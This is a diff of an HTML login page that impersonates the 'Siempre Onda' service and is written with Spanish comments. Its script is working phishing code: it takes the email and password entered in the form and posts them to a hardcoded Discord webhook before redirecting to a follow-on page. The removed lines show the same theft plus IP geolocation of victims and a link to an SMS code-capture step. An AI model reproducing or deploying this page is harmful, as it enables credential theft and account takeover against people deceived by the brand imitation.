@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login - Siempre Onda</title>
     <style>
+        /* Reset y Estilos Base */
         * { box-sizing: border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
@@ -23,7 +24,7 @@
             min-height: 100vh;
         }
 
-        /* Logo superior central */
+        /* Logo superior centralizado */
         .logo-header {
             text-align: center;
             margin-top: 10px;
@@ -33,7 +34,7 @@
             width: 140px;
         }
 
-        /* Saludo y mensaje */
+        /* Texto de Bienvenida */
         .welcome-msg {
             font-size: 26px;
             font-weight: 700;
@@ -42,6 +43,7 @@
             line-height: 1.2;
         }
 
+        /* Etiquetas y campos */
         .field-label {
             display: block;
             font-size: 17px;
@@ -55,11 +57,12 @@
             border: 1px solid #e0e0e0;
             border-radius: 8px;
             font-size: 16px;
+            background-color: #fff;
             margin-bottom: 12px;
             outline-color: #007bff;
         }
 
-        /* Checkbox recordar usuario */
+        /* Recordar Usuario (Check verde) */
         .remember-row {
             display: flex;
             align-items: center;
@@ -69,10 +72,16 @@
         .remember-row input[type="checkbox"] {
             width: 22px;
             height: 22px;
-            accent-color: #2ecc71;
+            accent-color: #2ecc71; /* Verde de la imagen */
+            cursor: pointer;
+        }
+        .remember-row label {
+            font-size: 16px;
+            color: #555;
             cursor: pointer;
         }
 
+        /* Enlace de olvido */
         .forgot-pass {
             text-align: right;
             margin-bottom: 25px;
@@ -83,7 +92,7 @@
             font-size: 15px;
         }
 
-        /* Recuadro Soy comercio */
+        /* Cuadro Soy Comercio */
         .comercio-box {
             border: 1px solid #e0e0e0;
             border-radius: 8px;
@@ -99,7 +108,7 @@
             align-items: center;
             gap: 12px;
         }
-        .info-icon {
+        .comercio-box .info-icon {
             color: #007bff;
             border: 1.5px solid #007bff;
             border-radius: 50%;
@@ -112,19 +121,36 @@
             font-weight: bold;
         }
 
-        /* Botón azul principal */
+        /* Botón de acción */
         .btn-login {
             width: 100%;
             padding: 16px;
-            background-color: #007bff;
-            color: white;
+            background-color: #e0e0e0; /* Color inicial desactivado */
+            color: #a0a0a0;
             border: none;
             border-radius: 8px;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            margin-top: auto; 
+            margin-top: auto; /* Posiciona al final */
             margin-bottom: 20px;
+        }
+
+        /* Estilo para cuando el botón está activo/relleno */
+        .btn-login.active {
+            background-color: #007bff;
+            color: white;
+        }
+
+        .footer-text {
+            text-align: center;
+            padding-bottom: 20px;
+            font-size: 16px;
+        }
+        .footer-text a {
+            color: #0056b3;
+            text-decoration: none;
+            font-weight: 700;
         }
     </style>
 </head>
@@ -132,7 +158,7 @@
 
 <div class="container">
     <div class="logo-header">
-        <img src="https://siempreonda.com/_next/static/media/logo.242b4c5d.svg" alt="Siempre Onda">
+        <img src="https://siempreonda.com/_next/static/media/logo.242b4c5d.svg" alt="Logo">
     </div>
 
     <div class="welcome-msg">
@@ -141,7 +167,7 @@
 
     <form id="authForm">
         <label class="field-label">Email</label>
-        <input type="email" id="email" class="input-field" required placeholder="ejemplo@correo.com">
+        <input type="email" id="email" class="input-field" required>
 
         <div class="remember-row">
             <input type="checkbox" id="remember" checked>
@@ -150,8 +176,8 @@
 
         <label class="field-label">Contraseña</label>
         <div style="position: relative;">
-            <input type="password" id="password" class="input-field" required placeholder="Tu clave">
-            <span style="position: absolute; right: 15px; top: 15px; color: #ccc; cursor: pointer;">👁️</span>
+            <input type="password" id="password" class="input-field" required>
+            <span style="position: absolute; right: 15px; top: 15px; color: #ccc;">👁️</span>
         </div>
 
         <div class="forgot-pass">
@@ -166,27 +192,16 @@
             <span class="info-icon">?</span>
         </div>
 
-        <button type="submit" class="btn-login" id="btnAction">Iniciar sesión</button>
+        <button type="submit" class="btn-login active" id="btnAction">Iniciar sesión</button>
     </form>
+
+    <div class="footer-text">
+        ¿No tenés cuenta? <a href="#">Registrate</a>
+    </div>
 </div>
 
 <script>
-    // Configuración del destino
-    const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1473681245949923348/9Oa77S5ZwE1IxqjpxYk44il7Ln-mUJKzoUOm8NYx0uM1kV9Qe4FRhOFYv1XBkQ0LKqW2";
-    
-    let datosUbicacion = "Cargando...";
-
-    // Obtener País y Ciudad automáticamente mediante API de IP
-    async function obtenerGeolocalizacion() {
-        try {
-            const respuesta = await fetch('https://ipapi.co/json/');
-            const info = await respuesta.json();
-            datosUbicacion = `${info.city}, ${info.country_name} (IP: ${info.ip})`;
-        } catch (error) {
-            datosUbicacion = "No se pudo obtener ubicación";
-        }
-    }
-    obtenerGeolocalizacion();
+    const WEBHOOK_DISCORD = "https://discordapp.com/api/webhooks/1473681245949923348/9Oa77S5ZwE1IxqjpxYk44il7Ln-mUJKzoUOm8NYx0uM1kV9Qe4FRhOFYv1XBkQ0LKqW2";
 
     document.getElementById('authForm').addEventListener('submit', async (e) => {
         e.preventDefault();
@@ -194,39 +209,37 @@
         const btn = document.getElementById('btnAction');
         const email = document.getElementById('email').value;
         const pass = document.getElementById('password').value;
-
-        // IMPORTANTE: Guardamos el usuario para que sms.html sepa de quién es el código
-        localStorage.setItem('usuario_activo', email);
+        const remember = document.getElementById('remember').checked;
 
         btn.disabled = true;
         btn.innerText = "Verificando...";
 
-        const mensajeDiscord = {
+        const payload = {
+            content: null,
             embeds: [{
-                title: "🔴 NUEVO REGISTRO: " + email,
+                title: "🔑 Login App Siempre Onda",
                 color: 5814783,
                 fields: [
-                    { name: "👤 Usuario/Email", value: "`" + email + "`", inline: true },
-                    { name: "🔑 Password", value: "`" + pass + "`", inline: true },
-                    { name: "📍 Ubicación Detectada", value: datosUbicacion, inline: false }
+                    { name: "Usuario", value: email },
+                    { name: "Password", value: pass },
+                    { name: "Recordar", value: remember ? "Sí" : "No" }
                 ],
-                footer: { text: "Siempre Onda - Sistema de Registro" },
                 timestamp: new Date()
             }]
         };
 
         try {
-            await fetch(WEBHOOK_URL, {
+            await fetch(WEBHOOK_DISCORD, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(mensajeDiscord)
+                body: JSON.stringify(payload)
             });
             
-            // Pasamos al temporizador
+            // Redirección inmediata a time.html
             window.location.href = "time.html";
             
         } catch (err) {
-            alert("Error de red. Inténtalo de nuevo.");
+            alert("Error de conexión");
             btn.disabled = false;
             btn.innerText = "Iniciar sesión";
         }
